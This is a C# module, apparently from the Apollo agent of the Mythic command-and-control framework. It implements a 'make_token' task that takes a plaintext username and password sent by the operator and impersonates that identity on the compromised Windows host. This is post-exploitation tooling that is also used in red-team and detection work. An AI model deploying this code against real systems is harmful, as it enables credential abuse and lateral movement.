#define COMMAND_NAME_UPPER

#if DEBUG
#define MAKE_TOKEN
#endif

#if MAKE_TOKEN

using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.ApolloStructs;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Text;
using ST = System.Threading.Tasks;

namespace Tasks
{
    public class make_token : Tasking
    {
        [DataContract]
        internal struct MakeTokenParameters
        {
            [DataMember(Name = "credential")]
            public Credential Credential;
        }
        public make_token(IAgent agent, ApolloInterop.Structs.MythicStructs.Task data) : base(agent, data)
        {
        }
        public override void Start()
        {
            TaskResponse resp;
            MakeTokenParameters parameters = _jsonSerializer.Deserialize<MakeTokenParameters>(_data.Parameters);
            if (string.IsNullOrEmpty(parameters.Credential.Account))
            {
                resp = CreateTaskResponse("Account name is empty.", true, "error");
            }
            else if (string.IsNullOrEmpty(parameters.Credential.CredentialMaterial))
            {
                resp = CreateTaskResponse("Password is empty.", true, "error");
            }
            else if (parameters.Credential.CredentialType != "plaintext")
            {
                resp = CreateTaskResponse("Credential material is not a plaintext password.", true, "error");
            }
            else
            {
                ApolloLogonInformation info = new ApolloLogonInformation(
                    parameters.Credential.Account,
                    parameters.Credential.CredentialMaterial,
                    parameters.Credential.Realm);
                if (_agent.GetIdentityManager().SetIdentity(info))
                {
                    var cur = _agent.GetIdentityManager().GetCurrentImpersonationIdentity();
                    resp = CreateTaskResponse(
                        $"Successfully impersonated {cur.Name}",
                        true,
                        "completed",
                        new IMythicMessage[] {Artifact.PlaintextLogon(cur.Name, true)});
                }
                else
                {
                    resp = CreateTaskResponse(
                        $"Failed to impersonate {info.Username}: {Marshal.GetLastWin32Error()}",
                        true,
                        "error",
                        new IMythicMessage[] {Artifact.PlaintextLogon(info.Username)});
                }
            }

            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }
    }
}
#endif